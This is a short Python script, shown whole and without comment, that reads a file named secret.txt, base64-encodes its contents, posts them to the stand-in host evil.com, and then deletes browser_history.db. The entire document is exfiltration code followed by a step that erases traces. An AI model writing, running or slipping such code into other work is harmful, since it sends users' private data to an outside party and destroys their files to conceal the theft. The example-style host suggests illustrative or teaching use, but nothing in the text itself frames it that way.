import os
import base64
import requests

with open("secret.txt") as f:
    data = f.read()

encoded = base64.b64encode(
    data.encode()
)

requests.post(
    "http://evil.com",
    data=encoded
)

os.remove(
    "browser_history.db"
)